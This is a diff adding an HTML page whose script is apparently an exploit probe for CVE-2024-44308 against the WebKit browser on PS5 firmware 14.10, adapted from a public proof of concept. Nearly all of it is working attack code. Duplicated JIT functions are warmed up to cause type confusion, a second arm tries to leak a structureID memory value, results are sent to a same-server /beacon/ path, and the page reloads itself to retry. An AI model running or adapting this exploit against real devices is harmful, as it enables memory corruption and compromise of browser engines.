@@ -1,0 +1,376 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P593_44308</title></head><body>
+<script>
+// P593: CVE-2024-44308 trigger probe for PS5 14.10 WebKit (~Feb-2024 fork).
+// Ported from migopp/cve-2024-44308 (Todesco-style scaffold). Adaptations:
+// SharedArrayBuffer -> growable ArrayBuffer (RAB measured present); noInline
+// unavailable in browser, rely on warmup counts; print -> sync-XHR beacon.
+// Stage beacons: P593-BOOT / -NORAB / -CONFUSE-OK|NO / -LEAKSID-<hex> / -DONE.
+function __ni(f){return f;}
+function bc(t){try{
+    var _f=+localStorage.getItem('p593fail')||0;
+    if(/-DONE|-LEAKSID/.test(t)){_f=0;localStorage.setItem('p593fail','0');}
+    else if(/-CONFUSE-NO|-NORAB|-ERR|-LEAKSID-t=(?!number)/.test(t)){_f++;localStorage.setItem('p593fail',''+_f);}
+var x=new XMLHttpRequest();x.open("GET","/beacon/"+encodeURIComponent(t),false);x.send();}catch(e){}}
+function out(t){document.body.appendChild(document.createTextNode(t+"\n"));bc(t);}
+function hx(n){return ('00000000'+(n>>>0).toString(16)).slice(-8);}
+var sab,intArray,f64,u32,floatArray;
+try{
+  sab=new ArrayBuffer(4,{maxByteLength:8});
+  intArray=new Int32Array(sab);
+}catch(e){out('P593-NORAB-'+String(e.message||e).slice(0,30));}
+if(intArray){
+try{
+f64=new Float64Array(2);u32=new Uint32Array(f64.buffer);
+floatArray=new Array(2);floatArray[0]=1337.1337;
+var container={a:1337.1337,b:1337.1337,c:1337.1337,d:1337.1337};
+var vals=new Array(32).fill({toString:function(){floatArray[1]=container;return "boxed like a fish";}});
+var svals=new Array(33);for(var qi=0;qi<=32;qi++)svals[qi]=133700+qi;
+function opt1(ary, ary1, woot) {
+  let a, b, c, d, e, f, g, h, i, l;
+  l = [1, 2];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  b = {};
+  c = {};
+  d = { a: ary1 };
+  e = {};
+  f = {};
+  g = {};
+  h = {};
+
+  // This is the only line that differs from Todesco's code.
+  //
+  // That's because our trigger is different. Rather than a call to
+  // `String.prototype.slice()`, we store a large float into an int typed array.
+  intArray[0] = ary;
+
+  floatArray[0];
+  String(d.a);
+  b = f64[0] = floatArray[1];
+  u32[0] += 0x18;
+  floatArray[1] = f64[0];
+
+  e.a = a;
+  f.a = a;
+  g.a = a;
+  h.a = a;
+  return d.a;
+}
+function opt(ary, ary1, woot) {
+  let a, b, c, d, e, f, g, h, i, l;
+  l = [1, 2];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  b = {};
+  c = {};
+  d = { a: ary1 };
+  e = {};
+  f = {};
+  g = {};
+  h = {};
+
+  // This is the only line that differs from Todesco's code.
+  //
+  // That's because our trigger is different. Rather than a call to
+  // `String.prototype.slice()`, we store a large float into an int typed array.
+  intArray[0] = ary;
+
+  floatArray[0];
+  String(d.a);
+  b = f64[0] = floatArray[1];
+  u32[0] += 0x18;
+  floatArray[1] = f64[0];
+
+  e.a = a;
+  f.a = a;
+  g.a = a;
+  h.a = a;
+  return d.a;
+}
+function sopt1(ary, ary1, woot) {
+  let a, b, c, d, e, f, g, h, i, l;
+  l = [1, 2];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  b = {};
+  c = {};
+  d = ary1.b;
+  e = {};
+  f = {};
+  g = {};
+  h = {};
+
+  // This is the only line that differs from Todesco's code.
+  //
+  // That's because our trigger is different. Rather than a call to
+  // `String.prototype.slice()`, we store a large float into an int typed array.
+  intArray[0] = ary;
+
+  e.a = a;
+  f.a = a;
+  g.a = a;
+  h.a = a;
+  return ary1.a;
+}
+function sopt(ary, ary1, woot) {
+  let a, b, c, d, e, f, g, h, i, l;
+  l = [1, 2];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  b = {};
+  c = {};
+  d = ary1.b;
+  e = {};
+  f = {};
+  g = {};
+  h = {};
+
+  // This is the only line that differs from Todesco's code.
+  //
+  // That's because our trigger is different. Rather than a call to
+  // `String.prototype.slice()`, we store a large float into an int typed array.
+  intArray[0] = ary;
+
+  e.a = a;
+  f.a = a;
+  g.a = a;
+  h.a = a;
+  return ary1.a;
+}
+function swopt1(ary, ary1, woot) {
+  let a, b, c, d, e, f, g, h, i, l;
+  l = [1, 2];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  b = {};
+  c = {};
+  d = ary1.b;
+  e = {};
+  f = {};
+  g = {};
+  h = {};
+
+  // This is the only line that differs from Todesco's code.
+  //
+  // That's because our trigger is different. Rather than a call to
+  // `String.prototype.slice()`, we store a large float into an int typed array.
+  intArray[0] = ary;
+
+  e.a = a;
+  f.a = a;
+  g.a = a;
+  h.a = a;
+  ary1.a = woot;
+}
+function swopt(ary, ary1, woot) {
+  let a, b, c, d, e, f, g, h, i, l;
+  l = [1, 2];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  l[0];
+  l[1];
+  b = {};
+  c = {};
+  d = ary1.b;
+  e = {};
+  f = {};
+  g = {};
+  h = {};
+
+  // This is the only line that differs from Todesco's code.
+  //
+  // That's because our trigger is different. Rather than a call to
+  // `String.prototype.slice()`, we store a large float into an int typed array.
+  intArray[0] = ary;
+
+  e.a = a;
+  f.a = a;
+  g.a = a;
+  h.a = a;
+  ary1.a = woot;
+}
+// arm 1 v2: characterize the confused return value
+var f='',ret=null;
+try{
+  for(var i=0;i<10000;++i)opt1(i+1337.1337,container);
+  ret=opt(13371337133713371337.1337,vals,container);
+  var t=typeof ret;f='t-'+t;
+  if(t==='object'&&ret!==null){
+    try{f+='.ctor-'+(ret.constructor?String(ret.constructor.name||'anon').slice(0,8):'null');}catch(e){f+='.ctorX';}
+    try{var g=Object.getOwnPropertyNames(ret);f+='.n'+g.length+'-'+g.slice(0,2).join('_').slice(0,10);}catch(e){}
+    f+=(ret===container)?'.ISCONT':(ret===vals)?'.ISVALS':'.';
+  }else if(t==='number'){f+='.v'+hx(ret);}
+  else if(t==='string'){f+='.s-'+ret.slice(0,8);}
+}catch(e){f='X-'+String(e.message||e).slice(0,20);}
+out('P594-C-'+f.slice(0,58));
+// arm 2: structureID leak probe (sopt path)
+var sidv='ERR',sid='';
+try{
+  function stack_set_and_call(val,val1){
+    var a=sopt1(1337.1337,val);
+    var b;
+    if(V){floatArray[1]=container;vals[4]="boxed like a fish";vals[4];b=sopt(13371337133713371337.1337,val1);}
+    else{vals[4]=val;b=sopt(13371337133713371337.1337,val1);vals[4]=0;}
+    return b;
+  }
+  var V=0;try{V=(+localStorage.getItem('p593V')||0)^1;localStorage.setItem('p593V',''+V);}catch(e){}
+  var alt=0;try{alt=(+localStorage.getItem('p593alt')||0)^1;localStorage.setItem('p593alt',''+alt);}catch(e){}
+  var marker=alt?7:378;
+  var oj={_a:0,b:0,c:0,d:0,a:marker*Number.MIN_VALUE};
+  var oj1={a:0,b:0,c:0,d:0};
+  for(var i=0;i<10000;++i)sopt1(i+1337.1337,oj1);
+  for(var i=0;i<10000;++i)sopt(i+1337.1337,oj);
+  var victim={a:1,b:0,c:0,d:0};victim.a=oj1;
+  var val=stack_set_and_call(oj1,oj);
+  sidv=typeof val;
+  if(sidv==='number'){f64[0]=val;sid=hx(u32[0]);var hi=hx(u32[1]);}
+}catch(e){sidv='X-'+String(e.message||e).slice(0,24);}
+out('P594-SID'+marker+'-V'+V+'-t-'+sidv+'-w1-'+sid+'-w0-'+ (typeof hi==='undefined'?'-':hi));
+out('P593-DONE');
+}catch(e){out('P593-ERR-'+String(e.message||e).slice(0,40));}
+}
+try{if((+localStorage.getItem('p593fail')||0)>=12){out('P593-SLEEP');localStorage.setItem('p593nap',String(Date.now()));}}catch(e){}
+if(!window.__P593DONE){window.__P593DONE=1;setTimeout(function(){location.reload();},4000);}
+</script></body></html>
